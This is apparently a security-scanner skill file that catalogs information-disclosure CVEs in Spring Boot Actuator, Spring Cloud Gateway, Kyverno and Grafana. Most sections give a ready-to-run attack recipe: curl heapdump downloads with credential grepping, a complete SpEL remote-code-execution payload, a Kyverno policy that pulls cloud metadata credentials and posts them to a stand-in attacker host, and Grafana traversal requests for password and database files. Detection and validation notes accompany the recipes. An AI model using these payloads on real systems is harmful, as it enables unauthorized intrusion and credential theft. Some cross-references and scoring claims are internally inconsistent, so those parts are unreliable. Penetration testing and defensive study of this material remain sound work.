---
name: information-disclosure-novel-deep
description: 2024-2026 information-disclosure CVEs — Spring Boot Actuator /heapdump default exposure, Spring Cloud Gateway SpEL, cluster-controller pod-identity RBAC bypass, and the credential-exfiltration primitive class.
sibling: information_disclosure
load_when: scan_mode == "deep"
---

# Information Disclosure — 2024–2026 CVE Catalog and Class Abstractions

Base `information_disclosure.md` owns the attack-surface framing, the `.git`-pickaxe / source-map / actuator-heapdump / CVSS-triage content, and the one-line CVE class-shapes with routes to this file. `information_disclosure_advanced_deep.md` owns the per-primitive technique treatments (framework debug endpoints, DVCS reconstruction, SSR hydration, observability, differential oracles, cache keys, cross-channel, metadata, CORS). This file owns the 2024–2026 version-boundary-as-finding CVEs — CVE-2025-48927 (TeleMessage Spring Boot Actuator `/heapdump` default exposure), CVE-2022-22947 (Spring Cloud Gateway Actuator SpEL), CVE-2026-4789 (Kyverno cluster-controller `http.Lib` SSRF class, info-disc-angled), and CVE-2021-43798 (Grafana path traversal) — plus the class abstractions that generalize each CVE to the next bug of its shape.

## Actuator /heapdump Public-Default (CVE-2025-48927, TeleMessage SGNL)

**Primitive.** The TeleMessage SGNL service's Spring Boot Actuator ships with `/heapdump` publicly exposed and unauthenticated. A single `curl -O http://<ip>:<port>/heapdump` downloads a ~150MB `.hprof` file containing the full JVM heap, which `strings` + `grep` mines for plaintext credentials, API keys, session tokens, and in-flight DB passwords. The primitive is a one-GET credential-exfiltration channel.

**Preconditions.** All of: (i) the deployed service is TeleMessage SGNL (or any Spring Boot ≤2.x deployment that exposed all actuator endpoints by default and was deployed without the override that modern Spring Boot requires); (ii) the `/heapdump` endpoint is reachable without authentication (observable via `curl -I http://<ip>:<port>/heapdump` returning `200` or `Content-Disposition: attachment; filename=heapdump`); (iii) the attacker has sufficient bandwidth for the ~150MB download (modest).

**Attack recipe.**

```bash
# Enumerate TeleMessage targets (CISA KEV listing provides scope):
# TeleMessage SGNL instances are typically Spring Boot web apps exposed on
# non-standard ports with the actuator reachable at /heapdump.

# One-request exfil:
curl -O 'http://target-ip:<port>/heapdump'
# Response: 200 OK, Content-Type: application/octet-stream, ~150MB file

# Mine the heap for credentials:
strings heapdump | grep -Ei '(password|secret|api[_-]?key|token|BEGIN RSA|jdbc:[a-z]+://|aws_access_key|AKIA[0-9A-Z]{16})'
# For deeper analysis, open in Eclipse Memory Analyzer (MAT) or run:
jhat -port 8080 heapdump                                # legacy JDK tool
# then browse http://localhost:8080/ for the object graph.
```

**Confirmation signal.** The response for `/heapdump` is `200 OK` with `Content-Type: application/octet-stream` and `Content-Length` in the hundreds-of-megabytes range; the leading bytes match the JVM heap-dump magic (`JAVA PROFILE 1.0.2` for HPROF format 1.0.2). CISA KEV listing (2025-07-01) confirms active exploitation; GreyNoise Labs primary research confirms the primitive is a one-request exfil without any secondary step.

**Impact.** Full credential exfiltration from any TeleMessage SGNL deployment and from any Spring Boot deployment with the pre-2.0 "all actuators exposed by default" configuration. The class generalizes: **any JVM-based service that routes its heap-dump endpoint publicly without authentication is a one-GET credential-exfiltration channel; the specific product name is incidental, and the hunt is to enumerate `/heapdump`, `/actuator/heapdump`, `/management/heapdump`, `/admin/heapdump` across every discovered JVM service's base path.** Modern Spring Boot (≥2.0) ships only `/health` and `/info` by default, requiring an explicit `management.endpoints.web.exposure.include=*` override to expose `/heapdump` — any deployment that ships this override enabled is a candidate for the same primitive regardless of product. Patched by deployment-configuration change (restrict exposure); CVE-2025-48927 CISA KEV: `https://www.cisa.gov/known-exploited-vulnerabilities-catalog`. Primary research: `https://www.labs.greynoise.io/grimoire/2025-07-16-checking-the-scope-of-cve-2025-48927/`.

## Spring Cloud Gateway Actuator SpEL (CVE-2022-22947)

**Primitive.** Spring Cloud Gateway's `/actuator/gateway` family of endpoints exposes the runtime routing table over HTTP: `/gateway/routes` lists routes, and `POST /gateway/routes/<id>` + `POST /gateway/refresh` creates and activates a new route. The route-filter DSL supports an `AddResponseHeader` filter whose header-value field accepts a Spring Expression Language (SpEL) expression that evaluates server-side. An attacker POSTs a route with a SpEL payload, refreshes the gateway to apply, then hits the route to trigger execution; the SpEL expression runs under the gateway's process identity. The chain is three HTTP requests to full RCE.

**Preconditions.** All of: (i) Spring Cloud Gateway version 3.1.0 or 3.0.6-and-earlier is deployed (fingerprint from the `/actuator/env` output's `BuildInfo` → `name=spring-cloud-gateway, version=<ver>`); (ii) the `/actuator/gateway` endpoints are exposed in the actuator's `management.endpoints.web.exposure.include` AND reachable without authentication; (iii) the attacker can craft the specific SpEL expression — standard payloads using `T(java.lang.Runtime).getRuntime().exec(...)` work on default-configured deployments.

**Attack recipe.**

```bash
# Step 1 — add a route with a SpEL payload in AddResponseHeader filter:
curl -s -X POST 'https://target/actuator/gateway/routes/x' \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "x",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "R",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com"
  }'

# Step 2 — refresh the gateway to apply:
curl -s -X POST 'https://target/actuator/gateway/refresh'

# Step 3 — hit the route to trigger SpEL evaluation; result is in the R header:
curl -si 'https://target/actuator/gateway/routes/x'
# Response includes: R: uid=0(root) gid=0(root)
```

For a one-shot payload that cleans up after itself, delete the route after exfiltrating output: `curl -X DELETE 'https://target/actuator/gateway/routes/x'; curl -X POST 'https://target/actuator/gateway/refresh'`. On older/newer gateway versions, the specific filter DSL and the SpEL evaluation shape vary; version-match before firing.

**Confirmation signal.** The response to Step 3 includes the attacker-defined `R` header carrying the output of the embedded command. The gateway's log reflects the route was added and refreshed; the exec'd process is visible in `ps aux` on the gateway host if an attacker can observe it. On patched builds (3.1.1 / 3.0.7+), the route-add step is still permitted but the SpEL expression is parsed in a restricted context that blocks `T()` static-method access.

**Impact.** Full RCE as the Spring Cloud Gateway process user from any unauthenticated reach into `/actuator/gateway`. The class generalizes: **actuator endpoints that write to the runtime routing table + a filter DSL that evaluates expressions = runtime code execution authored over HTTP.** The hunt is to grep for other framework actuators that permit runtime-mutation of expression-evaluating configuration — Camel route additions, Spring Integration flow adds, any management endpoint that accepts an expression-language payload. Patched in Spring Cloud Gateway 3.1.1 (2022-02-23) and 3.0.7 (2022-02-23); NVD canonical: `https://nvd.nist.gov/vuln/detail/CVE-2022-22947`.

## Cluster-Controller Pod-Identity RBAC Bypass (CVE-2026-4789, Kyverno)

**Primitive.** Kyverno's CEL `http.Lib()` extension allows `NamespacedValidatingPolicy` authors to invoke `http.Get(url)` / `http.Post(url, body)` from inside policy evaluation. The HTTP calls execute as network calls from the Kyverno controller pod — not as Kubernetes API calls from the policy author's user identity. The controller pod carries its own service-account token and its own cloud-identity binding (via IRSA on EKS, Workload Identity on GKE, Managed Identity on AKS), neither of which the policy author's RBAC role grants them. A namespace-scoped user who can create policies therefore performs arbitrary HTTP calls from the Kyverno controller pod's identity, bypassing Kubernetes RBAC entirely because RBAC gates API calls, not network calls. The information-disclosure angle is the class abstraction — the mechanism itself is SSRF, owned by `ssrf.md`.

**Preconditions.** All of: (i) Kyverno version in the vulnerable range (`>=1.16.0, <1.17.0`, per GHSA-rggm-jjmc-3394); (ii) the attacker has permission to create `NamespacedValidatingPolicy` (or `Policy`) resources in at least one namespace — a typical "developer" role on EKS/GKE/AKS; (iii) the Kyverno controller pod's cloud-identity binding (IRSA/WI/MI) grants a non-trivial IAM role (the typical IRSA role for Kyverno has write access to the cluster's control plane, which is sufficient to pivot cluster-wide).

**Attack recipe.**

```yaml
# NamespacedValidatingPolicy in the attacker's namespace with a CEL expression
# that performs the HTTP call. The actual Kyverno DSL may vary slightly across
# minor versions; the pattern is CEL → http.Get(URL) → response is observable
# in the policy evaluation output or in an audit event.
apiVersion: policies.kyverno.io/v1alpha1
kind: NamespacedValidatingPolicy
metadata:
  name: ssrf-leak
  namespace: attacker-ns
spec:
  rules:
  - name: ssrf
    validate:
      cel:
        expressions:
        - expression: |
            http.Get('http://169.254.169.254/latest/meta-data/iam/security-credentials/').status == 200
```

The response from the IMDS carries the Kyverno controller's temporary cloud credentials; the credentials are observable in the policy-evaluation output or exfiltrated via a second `http.Post(attacker.tld, body)` call in the same expression. Cross-namespace targeting:

```yaml
expression: |
  http.Get('http://<service>.<other-namespace>.svc.cluster.local/health').status == 200
```

reaches internal services in any namespace, regardless of the attacker's own namespace scope.

**Confirmation signal.** The policy-evaluation audit event (`kubectl get events --field-selector reason=PolicyApplied`) includes the HTTP call's response data, OR the controlled attacker.tld receives a POST with the IMDS response body embedded (the cloud credentials). Independent confirmation: the merged fix PR #15729 restricts `http.Lib` to cluster-scoped policies, confirming the primitive is namespace-scoped-policy-reachable in the vulnerable range. On patched versions (≥1.17.0), the `http.Get()` from a `NamespacedValidatingPolicy` is rejected.

**Impact (information-disclosure angle).** Full cluster-wide service discovery (internal service names, internal API responses) and cloud-identity disclosure (IMDS credentials of the Kyverno controller pod) from a namespace-scoped policy-create privilege. The class abstraction is: **cluster-controller runtimes execute policy expressions under the controller's identity, not the author's; any policy-expression language with network side effects therefore converts namespace-scoped policy privilege into cluster-wide reachability. The hunt is to inventory every admission controller / policy engine / webhook framework (Kyverno, OPA Gatekeeper, Validating Admission Policies, Falco, custom webhooks) and classify which permit author-controlled expressions with network side effects.** The *SSRF mechanism* is owned by `ssrf.md § Cloud IMDS Exfiltration`; the *credential post-exfil IAM-abuse* is owned by `cloud/*`. This file names the class and the version boundary. Patched in Kyverno 1.17.0; GHSA-rggm-jjmc-3394: `https://github.com/kyverno/kyverno/security/advisories/GHSA-rggm-jjmc-3394`; NVD: `https://nvd.nist.gov/vuln/detail/CVE-2026-4789`.

## Grafana Datasource Proxy Path Traversal (CVE-2021-43798)

**Primitive.** Grafana versions 8.0.0-beta1 through 8.3.0 (pre-8.3.1) permit path traversal in the datasource plugin URL via `/public/plugins/<pluginId>/..%2f..%2f..%2fetc%2fpasswd`. The traversal reaches the Grafana host's filesystem and returns the referenced file. The primitive is unauthenticated arbitrary file read on vulnerable Grafana deployments; the real-world impact pivots through `/etc/grafana/grafana.ini` (database URI with credentials) and the Grafana SQLite database (session tokens, admin credentials).

**Preconditions.** All of: (i) Grafana version in the range 8.0.0-beta1 through 8.3.0 (fingerprint via `/api/health` returning `{"commit":"...","database":"ok","version":"8.x.x"}`); (ii) the `/public/plugins/<pluginId>/` endpoint is reachable (default); (iii) a valid plugin ID is known (common defaults: `grafana`, `alertlist`, `annolist`, `barchart`, `bargauge`, `cloudwatch`, `dashlist`, `elasticsearch`, `gauge`, `geomap`, `graph`, `heatmap`, `histogram`, `influxdb`, `jaeger`, `logs`, `loki`, `mysql`, `news`, `nodeGraph`, `piechart`, `pluginlist`, `postgres`, `prometheus`, `stat`, `state-timeline`, `status-history`, `table`, `table-old`, `tempo`, `testdata`, `text`, `timeseries`, `welcome`, `zipkin`).

**Attack recipe.**

```bash
# Fingerprint Grafana version:
curl -s 'https://target/api/health' | jq -r .version

# Exfil arbitrary file (requires any valid pluginId; alertlist is default):
curl -s 'https://target/public/plugins/alertlist/..%2F..%2F..%2F..%2Fetc%2Fpasswd'

# High-value targets:
curl -s 'https://target/public/plugins/alertlist/..%2F..%2F..%2F..%2Fetc%2Fgrafana%2Fgrafana.ini'
# → datasource URIs incl. SQL creds, LDAP binds, OAuth secrets.
curl -s -o grafana.db 'https://target/public/plugins/alertlist/..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db'
# → SQLite DB; sqlite3 grafana.db 'select * from user' leaks admin password hashes.
```

**Confirmation signal.** The response contains the content of the targeted file (`root:x:0:0:...` for `/etc/passwd`, INI structure for `grafana.ini`, SQLite header bytes for `grafana.db`). On patched Grafana (≥8.3.1), the same request returns 404 or a path-canonicalization error.

**Impact.** Unauthenticated arbitrary file read on vulnerable Grafana; pivots to credential disclosure through `grafana.ini` and admin-password-hash disclosure through `grafana.db` (crack offline, log in as admin). Routes to `path_traversal_lfi_rfi.md § URL-Encoded Traversal` for the general class and to `grafana_prometheus` (if present in the skill corpus) for Grafana-specific post-exploitation. Patched in Grafana 8.3.1 (2021-12-07); NVD: `https://nvd.nist.gov/vuln/detail/CVE-2021-43798`.

## Canonical Version/Fix Table

Single-owner for Batch 10 information-disclosure CVEs — the per-trio CVE single-ownership standard parks all version strings and GHSA IDs here. Base and advanced files name CVE numbers + one-line class-shape + a route to this file; no version metadata in base or advanced.

| CVE | Component | Vulnerable Range | Patched Version | Mechanism Fingerprint |
|---|---|---|---|---|
| CVE-2025-48927 | TeleMessage SGNL (Spring Boot Actuator) | per CISA KEV scope | per vendor patch (deployment-config change restricts exposure) | `/heapdump` public, unauthenticated; HPROF 1.0.2 magic bytes in response body |
| CVE-2022-22947 | Spring Cloud Gateway | 3.1.0 and 3.0.6-and-earlier | 3.1.1 (2022-02-23), 3.0.7 (2022-02-23) | `/actuator/gateway/routes` POST + `/refresh` + GET → SpEL in `AddResponseHeader` filter executes server-side |
| CVE-2026-4789 | Kyverno | `>=1.16.0, <1.17.0` | 1.17.0 | CEL `http.Lib()` SSRF from `NamespacedValidatingPolicy` runs under controller pod identity → IMDS + cross-namespace reach |
| CVE-2021-43798 | Grafana | 8.0.0-beta1 through 8.3.0 | 8.3.1 (2021-12-07) | `/public/plugins/<id>/..%2F..%2F` path traversal → unauthenticated file read |
| CVE-2026-40976 | Spring Boot 4.0 (servlet, actuator-autoconfigure) | 4.0.0–4.0.5 | 4.0.6 | Default web security filter chain ineffective → unauthenticated access to all endpoints incl. actuator |
| CVE-2025-53602 | Zipkin (Spring Boot Actuator) | ≤ 3.5.1 | per vendor advisory | `/heapdump` endpoint exposed via Spring Boot Actuator — same class as CVE-2025-48927 |
| CVE-2025-22235 | Spring Boot (Spring Security + EndpointRequest) | versions where `EndpointRequest.to()` generates `null/**` matcher | per vendor advisory | `EndpointRequest.to()` creates `/null/**` matcher when endpoint disabled → path `/null` unprotected |

The Kyverno row references GHSA-rggm-jjmc-3394 for authoritative advisory metadata; the fix PRs are #15729 (restricts `http.Lib` to cluster-scoped policies) and #15789 (adds operator-controlled opt-in and destination filtering). The TeleMessage row defers the exact version range to CISA's KEV scope because the primitive is a deployment-configuration consequence rather than a specific-code vulnerability; the generalization is Spring Boot < 2.0's "all actuators exposed by default" posture that any Spring Boot deployment can reintroduce via `management.endpoints.web.exposure.include=*`.

## Spring Boot 4.0 Default Security Bypass (CVE-2026-40976, CVSS 9.1)

**Primitive.** In Spring Boot 4.0.0 through 4.0.5, the default web security filter chain is ineffective under a specific configuration combination, allowing unauthenticated access to all endpoints including actuator endpoints. The application must be a servlet-based web application, rely on Spring Boot's default web security filter chain (no custom Spring Security configuration), depend on `spring-boot-actuator-autoconfigure`, and not depend on `spring-boot-health`.

**Preconditions.** All of: (i) Spring Boot 4.0.0–4.0.5; (ii) servlet-based web application; (iii) no custom Spring Security configuration (relies on the auto-configured default); (iv) depends on `spring-boot-actuator-autoconfigure`; (v) does not depend on `spring-boot-health`. If any condition is unmet, the application is not vulnerable.

**Attack recipe.**
```bash
# Fingerprint Spring Boot version via actuator:
curl -s 'https://target/actuator/info' | jq '.build.version'

# If 4.0.0–4.0.5 and the default security filter is in effect,
# all endpoints are reachable without authentication:
curl -s 'https://target/actuator/env'       # configuration, secrets
curl -s 'https://target/actuator/heapdump' -o heapdump  # JVM heap
curl -s 'https://target/actuator/beans'     # bean graph
```

**Impact.** Complete bypass of Spring Boot's default authentication on all endpoints. The actuator surface carries the same credential-exfiltration primitives as CVE-2025-48927 (`/heapdump`), plus environment variables (`/env`), bean definitions (`/beans`), and any custom endpoints. The 9.1 CRITICAL score reflects unauthenticated network access with full confidentiality and integrity impact. CWE-862 (Missing Authorization).

**Fix shape.** Upgrade to Spring Boot 4.0.6. The fix corrects the auto-configuration ordering so the default security filter chain is properly applied when `spring-boot-health` is absent.

## Zipkin Heapdump Exposure (CVE-2025-53602, CVSS 5.3)

**Primitive.** Zipkin through version 3.5.1 ships with a `/heapdump` endpoint exposed via Spring Boot Actuator. The finding is analogous to CVE-2025-48927 — the actuator endpoint is reachable and serves the JVM heap dump to any requester. The advisory explicitly notes the similarity to the TeleMessage finding.

**Preconditions.** All of: (i) Zipkin ≤ 3.5.1; (ii) `/heapdump` or `/actuator/heapdump` endpoint reachable without authentication.

**Attack recipe.** Identical to the CVE-2025-48927 recipe above — substitute the Zipkin service's address. Zipkin deployments typically hold distributed-tracing data including service credentials, trace headers, and inter-service authentication tokens in the heap.

**Impact.** Credential exfiltration from the Zipkin service's JVM heap. Zipkin's heap is particularly valuable because it holds distributed-tracing spans containing authorization headers, API keys, and inter-service tokens from all traced services. CWE-1188 (Insecure Default Initialization of Resource). The 5.3 MEDIUM score reflects the lower attack complexity relative to CVE-2025-48927 (Zipkin is an internal service, typically not internet-facing — adjacent-network access vector).

## Spring Boot EndpointRequest Null-Matcher (CVE-2025-22235, CVSS 7.3)

**Primitive.** When `EndpointRequest.to()` is used in a Spring Security chain configuration to secure an actuator endpoint, and that endpoint is disabled or not exposed via web, the method creates a request matcher for the path `/null/**` instead of the intended endpoint path. If the application handles requests to `/null` and that path needs protection, the security configuration is ineffective for it.

**Preconditions.** All of: (i) Spring Security is in use; (ii) `EndpointRequest.to()` is used in the security chain; (iii) the referenced actuator endpoint is disabled or not exposed; (iv) the application handles requests to `/null` and that path requires protection.

**Impact.** Authentication/authorization bypass for the `/null` path. The severity depends on what the application serves at `/null/**` — if the path is unused, no impact; if the application routes meaningful content or functionality there, the security chain is bypassed. CWE-20 (Improper Input Validation). The finding is primarily relevant as a defense-in-depth concern and as an example of the "disabled-endpoint creates unexpected matcher" class.

**Fix shape.** The fix ensures `EndpointRequest.to()` returns a matcher that matches nothing (rather than `/null/**`) when the referenced endpoint is disabled or unexposed.

## Class Abstraction — "Credential Exfiltration Primitive"

The seven CVEs above are instances of a single class abstraction: **a reachable endpoint under the attacker's control emits a response whose body or triggered side effect carries attacker-usable credentials**. The specific endpoints vary (actuator heapdump, Grafana INI file, Kyverno-driven IMDS fetch, Spring Cloud Gateway RCE that then reads credentials), but the class pattern recurs across stacks: **anywhere a service process holds credentials and anywhere that service process's data is readable or triggerable by an unauthenticated external request, the primitive exists**. The hunt is to enumerate every endpoint of the shape (readable-process-memory-dump, readable-config-file, triggerable-command-execution) across the deployed stack and verify authentication is required.

A second class abstraction emerging in the 2026 window is the **"authorization-via-indirect-identity"** class: Kyverno executes under the controller pod's identity, not the policy author's; Spring Cloud Gateway's SpEL evaluates under the gateway's process identity; actuator-based routing executes under the actuator-process identity. In each case, the attacker's reachable surface is a thin DSL / routing-table / policy-expression layer, and the *effective* identity executing the resulting operation is the service's own, not the attacker's. The hunt generalizes: **any admission controller, orchestration layer, policy engine, routing framework, or workflow runtime that lets an external request author an expression / policy / route whose evaluation runs under the service's own identity is a candidate for the same class.** The specific instances this file catalogs are Kyverno (CVE-2026-4789) and Spring Cloud Gateway (CVE-2022-22947); the class generalizes to a broader set of runtimes.

## Chaining Surface

**Upstream primitives:** `reconnaissance/*` enumerates the actuator / debug / plugin endpoints; `broken_function_level_authorization.md` grants access to admin-reachable actuator endpoints; `idor.md` grants cross-tenant access to resources whose disclosure populates the diff-oracle.

**Downstream capabilities:**

- `rce.md` — Spring Cloud Gateway SpEL (CVE-2022-22947) reaches direct RCE; actuator-heapdump recovered MachineKey + `insecure_deserialization.md § ASP.NET ViewState Forgery` reaches RCE on .NET deployments.
- `ssrf.md § Cloud IMDS Exfiltration` — Kyverno `http.Lib()` reaches IMDS from the controller pod identity; the mechanism is SSRF, this file names only the class abstraction.
- `cloud/*` — IMDS-exfiltrated credentials carry the controller pod's IAM role; post-exfil cloud-plane access is per-provider.
- `authentication_jwt.md § HMAC Secret Recovery` — heapdump-recovered JWT signing keys forge tokens.
- `path_traversal_lfi_rfi.md § URL-Encoded Traversal` — the Grafana primitive is a specific URL-encoded traversal instance.
- `insecure_deserialization.md` — Jolokia-reachable MBeans and ViewState-forging chains both deserialize attacker payloads under the service identity.

**Composite chains (routed by filename):**

1. **TeleMessage `/heapdump` GET → MachineKey / JWT secret → forge token → ATO.** One `curl` downloads the heap; `strings` + grep extracts the HMAC secret; forge a JWT with elevated claims; present to the application. Routes to `authentication_jwt.md`.

2. **Spring Cloud Gateway `/actuator/gateway/routes` POST + refresh + GET → RCE.** Three HTTP requests; see the Spring Cloud Gateway section above for the full payload. Routes to `rce.md`.

3. **Kyverno `http.Lib()` IMDS exfil → cloud IAM credential → cluster-wide pivot.** `NamespacedValidatingPolicy` with CEL `http.Get()` against IMDS; response carries temporary credentials; attacker assumes the controller role and reaches cluster-wide resources via the control plane. The *info-disc finding* is the class abstraction (RBAC-via-network-call bypass); the *SSRF primitive* routes to `ssrf.md`; the *post-exfil IAM abuse* routes to `cloud/*`.

4. **Grafana path traversal → `grafana.db` → admin password hash → login as admin → datasource SSRF.** Traversal pulls the SQLite DB; crack admin hash; login; use Grafana's datasource-proxy endpoint for second-order SSRF into internal services. Routes to `ssrf.md § Grafana Datasource Proxy`.

5. **Source-map leak → recovered sources name `/actuator/*` paths → full actuator sweep → credential disclosure.** `.map` reconstruction (owned by advanced sibling) reveals the actuator base path (often non-default to resist enumeration); subsequent sweep against the recovered base path pulls `/heapdump`, `/env`, `/beans`. Routes within the advanced sibling and the `rce.md` chain for actuator-reachable RCE.

## Detection and Verification Methodology

- **Enumeration against the per-CVE endpoint patterns.** For CVE-2025-48927, probe `/heapdump` and `/actuator/heapdump` on every discovered JVM service's base path; a 200 with HPROF magic in the body is the fingerprint. For CVE-2022-22947, probe `/actuator/gateway` and `/actuator/gateway/routes`; a 200 with a JSON array of route definitions is the fingerprint. For CVE-2026-4789, enumerate installed admission controllers in a cluster (`kubectl api-resources | grep -i policy`) and classify by version. For CVE-2021-43798, probe `/api/health` for a version string in the vulnerable range.
- **Measured probe for CVE-2025-48927.** `curl -I http://target:<port>/heapdump` returns `200` with `Content-Length` in hundreds of MB; a `HEAD` is sufficient to confirm reachability without downloading. The subsequent `GET` is the exfiltration step; staging the probe as HEAD-first lets a scanner confirm the primitive without triggering a full download.
- **Non-destructive probe for CVE-2022-22947.** A `GET /actuator/gateway/routes` enumerates existing routes without altering state; a `POST` to add a route with a *benign* SpEL expression (`#{1+1}` → header value `2`) confirms SpEL evaluation without executing OS commands. Full RCE confirmation requires the `T()` static-call path and should run only in authorized engagements.
- **Non-destructive probe for CVE-2026-4789.** A `NamespacedValidatingPolicy` with `http.Get('http://attacker.tld/kyverno-probe')` emits an outbound HTTP request from the controller pod observable in the attacker's log; the response carries the pod's User-Agent (typically `Kyverno/<version>`), confirming the primitive and the version.
- **Build-and-config fingerprint beyond version.** For actuator-based CVEs, confirm `management.endpoints.web.exposure.include` includes the vulnerable endpoint (visible in `/actuator/env` output); a version-match without the exposure config means the primitive is not reachable.

## False-Positive Discipline

- **A reachable `/heapdump` endpoint on a Spring Boot ≥2.0 deployment requires an explicit exposure override, not a Spring Boot CVE.** Modern Spring Boot ships only `/health` and `/info` by default; if `/heapdump` is reachable, the deployment is configured to expose it. The finding is "deployment configuration exposes credential-dumping endpoint," not "Spring Boot has a vulnerability." CVE-2025-48927's TeleMessage-specific framing acknowledges this — the CVE applies to the specific product's deployment default, not to Spring Boot's generic posture.
- **A SpEL route-add that returns 2xx is not RCE confirmation.** The route-add may succeed while SpEL evaluation is restricted; the confirmation is the Step 3 response showing the embedded SpEL's effect in the `R` header. Report only when the full three-step chain fires.
- **Kyverno in the 1.16.x range without a user who can create `NamespacedValidatingPolicy` is not reachable.** The primitive is namespace-scoped-policy-reachable; a cluster where ordinary users cannot create such policies closes the reach. Report scoped to the user tier that can trigger the primitive, not "any Kyverno 1.16.x deployment."
- **The information-disclosure framing of CVE-2026-4789 is the class abstraction, not the SSRF mechanism.** Duplicating the SSRF content in this file would be wrong per §8 (overlap discipline). The mechanism is owned by `ssrf.md`; this file names the RBAC-via-network-call class. Report the class abstraction here and route to the SSRF-mechanism owner for the specific primitive details.
- **Grafana version in the vulnerable range without the `/public/plugins/<id>/` endpoint reachable is not exploitable.** Reverse proxies that filter `/public/*` close the reach; the finding requires the endpoint to be reachable from the attacker's position.

## Validation

- Preserve the exact HTTP request+response for the probed endpoint (actuator probe, Grafana path-traversal, Kyverno policy application, Spring Cloud Gateway three-step chain), including identity headers and the full response body.
- For heap-dump recovery, preserve the extracted credential strings and the specific heap offsets (via Eclipse MAT or `jhat`) that produced them; the finding is reproducible from the dump and the extraction script.
- For Kyverno RBAC-bypass findings, preserve the `NamespacedValidatingPolicy` YAML, the audit event showing the policy was applied, and the attacker-side observation of the IMDS response (if captured). The chain is reproducible from the YAML and the controller version.
- For Grafana path-traversal findings, preserve the exact URL-encoded request path and the recovered file content. The specific plugin ID used should be noted (the primitive works with any valid plugin ID; some deployments disable specific plugins).
- Capture the deployed version via the per-stack fingerprint endpoint (`/api/health` for Grafana, `/actuator/env` for Spring Boot, `kubectl get deployments -n kyverno` for Kyverno); the version-boundary claim is only valid if the version is observably in the vulnerable range.

## Summary

The 2024–2026 information-disclosure CVE catalog clusters around four primitives: public-default actuator heapdumps carrying plaintext credentials (CVE-2025-48927), actuator-reachable expression-DSLs that compile into runtime code execution (CVE-2022-22947), cluster-controller policy engines whose expression languages make network calls under the controller's cloud identity (CVE-2026-4789), and classic path-traversal in observability-stack serving code (CVE-2021-43798). Two class abstractions unify them: credential-exfiltration primitives emerge wherever an authenticated service process's data is externally readable, and authorization-via-indirect-identity primitives emerge wherever an external request authors expressions that evaluate under the service's own identity rather than the author's. CVE single-ownership parks all version metadata in the canonical table above; chain routing by filename sends the mechanism-side detail to `ssrf.md`, `rce.md`, `authentication_jwt.md`, `insecure_deserialization.md`, and `cloud/*` as appropriate.
